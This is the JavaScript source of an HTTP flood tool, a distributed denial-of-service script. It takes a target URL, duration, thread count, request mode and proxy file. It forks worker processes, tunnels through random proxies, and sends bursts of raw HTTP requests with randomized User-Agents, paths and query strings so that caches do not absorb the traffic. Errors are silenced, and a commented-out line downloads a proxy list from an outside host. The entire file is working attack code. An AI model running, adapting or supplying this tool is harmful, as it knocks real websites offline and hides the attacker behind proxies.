const net = require('net');
const fs = require('fs');
const url = require('url');
const request_2 = require('request');
const { constants } = require('crypto');
var colors = require('colors');
const UserAgent = require('user-agents');
var theJar = request_2.jar();
const path = require("path");
const { cpus } = require('os');
var request = require('request');
const http = require('http');
const tls = require('tls');
const execSync = require('child_process').execSync;
const cluster = require('cluster');
const { exec } = require('child_process');
//exec('curl -O https://sheesh.rip/http.txt --user-agent --http2 "hello bnt"')

//Coming soon...
var cookies = {};

var VarsDefinetions = {
Objetive: process.argv[2],
time: process.argv[3],
threads:process.argv[4],
mode:process.argv[5],
proxfile:process.argv[6]
}

if (process.argv.length !== 7) {
    console.log(`                       
Usage: node ${path.basename(__filename)} <Target> <Time> <Threads> <Mode> <proxfile>
Usage: node ${path.basename(__filename)} <http://example.com> <60> <30> <query> <http.txt>

Modes:
query
path
mix
get
post
head
------------------------------------------------------------------
`);
    process.exit(0);
}
var fileName = __filename;
var file = path.basename(fileName);

var proxies = fs.readFileSync(VarsDefinetions.proxfile, 'utf-8').toString().replace(/\r/g, '').split('\n');

 process.on('uncaughtException', function() {});
process.on('unhandledRejection', function() {});
require('events').EventEmitter.defaultMaxListeners = Infinity;

function getRandomNumberBetween(min,max){
    return Math.floor(Math.random()*(max-min+1)+min);
}
function RandomString(length) {
  var result           = '';
  var characters       = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
  var charactersLength = characters.length;
  for ( var i = 0; i < length; i++ ) {
     result += characters.charAt(Math.floor(Math.random() * charactersLength));
  }
  return result;
}
var parsed = url.parse(VarsDefinetions.Objetive);
process.setMaxListeners(15);
let browser_saves = '';

if (cluster.isMaster) {
	 console.log('\nHTTP ' + process.argv[5] + ' flood sent for ' + process.argv[3] + ' seconds with ' + process.argv[4] + ' threads! Target: ' + process.argv[2] + '\n')
    for (let i = 0; i < VarsDefinetions.threads; i++) {
        cluster.fork();
    }
} else {
	setInterval(flood);
	setTimeout(function() {
	  console.clear();
	  process.exit()
	}, VarsDefinetions.time*1000);
}


function BuildRequest() {
let path = parsed.path;
const userAgentv2 = new UserAgent();
var useragent = userAgentv2.toString();
if (VarsDefinetions.mode == "query") {
var raw_socket = 'GET' + ' ' + path + '?_=' + RandomString(getRandomNumberBetween(1,24)) + ' HTTP/1.1\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nUpgrade-Insecure-Requests: 1\r\nHost: ' + parsed.host + '\r\nUser-Agent: ' + useragent + '\r\nAccept-Language: en-us\r\nAccept-Encoding: gzip, deflate, br\r\nConnection: keep-alive\r\n\r\n'
} else if (VarsDefinetions.mode == "mix") {
const methods = ['GET', 'POST', 'PRI', 'HEAD']
var raw_socket = methods[Math.floor(Math.random() * methods.length)] + ' ' + path + ' HTTP/1.1\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nUpgrade-Insecure-Requests: 1\r\nHost: ' + parsed.host + '\r\nUser-Agent: ' + useragent + '\r\nAccept-Language: en-us\r\nAccept-Encoding: gzip, deflate, br\r\nConnection: keep-alive\r\n\r\n'
} else if (VarsDefinetions.mode == "get") {
var raw_socket = 'GET' + ' ' + path + ' HTTP/1.1\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nUpgrade-Insecure-Requests: 1\r\nHost: ' + parsed.host + '\r\nUser-Agent: ' + useragent + '\r\nAccept-Language: en-us\r\nAccept-Encoding: gzip, deflate, br\r\nConnection: keep-alive\r\n\r\n'
} else if (VarsDefinetions.mode == "post") {
var raw_socket = 'POST' + ' ' + path + ' HTTP/1.1\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nUpgrade-Insecure-Requests: 1\r\nHost: ' + parsed.host + '\r\nUser-Agent: ' + useragent + '\r\nAccept-Language: en-us\r\nAccept-Encoding: gzip, deflate, br\r\nConnection: keep-alive\r\n\r\n'
} else if (VarsDefinetions.mode == "head") {
var raw_socket = 'HEAD' + ' ' + path + ' HTTP/1.1\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nUpgrade-Insecure-Requests: 1\r\nHost: ' + parsed.host + '\r\nUser-Agent: ' + useragent + '\r\nAccept-Language: en-us\r\nAccept-Encoding: gzip, deflate, br\r\nConnection: keep-alive\r\n\r\n'
} else if (VarsDefinetions.mode == "path") {
var raw_socket = 'GET' + ' ' + path + RandomString(getRandomNumberBetween(1,24)) + ' HTTP/1.1\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nUpgrade-Insecure-Requests: 1\r\nHost: ' + parsed.host + '\r\nUser-Agent: ' + useragent + '\r\nAccept-Language: en-us\r\nAccept-Encoding: gzip, deflate, br\r\nConnection: keep-alive\r\n\r\n'
} else {
var raw_socket = 'GET' + ' ' + path + ' HTTP/1.1\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nUpgrade-Insecure-Requests: 1\r\nHost: ' + parsed.host + '\r\nUser-Agent: ' + useragent + '\r\nAccept-Language: en-us\r\nAccept-Encoding: gzip, deflate, br\r\nConnection: keep-alive\r\n\r\n'
}
return raw_socket;
}
function flood() {

var proxy = proxies[Math.floor(Math.random() * proxies.length)];
proxy = proxy.split(':');

const agent = new http.Agent({
keepAlive: true,
keepAliveMsecs: 50000,
maxSockets: Infinity,
});

var tlsSessionStore = {};

var req = http.request({
    host: proxy[0],
    agent: agent,
    globalAgent: agent,
    port: proxy[1],
      headers: {
    'Host': parsed.host,
    'Proxy-Connection': 'keep-alive',
    'Connection': 'keep-alive',
  },
    method: 'CONNECT',
    path: parsed.host+':443'
}, function(){ 
    req.setSocketKeepAlive(true);
 });

req.on('connect', function (res, socket, head) {
    tls.authorized = true;
    tls.sync = true;
    var TlsConnection = tls.connect({
        ciphers: 'TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:TLS_AES_128_GCM_SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA256:ECDHE-RSA-AES256-SHA384:DHE-RSA-AES256-SHA384:ECDHE-RSA-AES256-SHA256:DHE-RSA-AES256-SHA256:HIGH:!aNULL:!eNULL:!EXPORT:!DES:!RC4:!MD5:!PSK:!SRP:!CAMELLIA',
        secureProtocol: 'TLSv1_2_method',
        honorCipherOrder: true,
        ecdhCurve: 'auto',
        requestOCSP: true,                                                  
        requestCert: true,
        host: parsed.host,
        port: 80,
        secureOptions: constants.SSL_OP_NO_SSLv3 | constants.SSL_OP_NO_TLSv1,        
        servername: parsed.host,                                                
        secure: true,
        rejectUnauthorized: false,
        socket: socket
    }, function () {

for (let j = 0; j < 64; j++) {

TlsConnection.setKeepAlive(true, 10000)
TlsConnection.setTimeout(10000);
var r = BuildRequest();
TlsConnection.write(r);
}
});

TlsConnection.on('disconnected', () => {
    TlsConnection.destroy();
});

TlsConnection.on('timeout' , () => {
    TlsConnection.destroy();
});

TlsConnection.on('error', (err) =>{
    TlsConnection.destroy();
});

TlsConnection.on('data', (chunk) => { 
});

TlsConnection.on('end', () => {
  TlsConnection.destroy();
});

}).end()
}
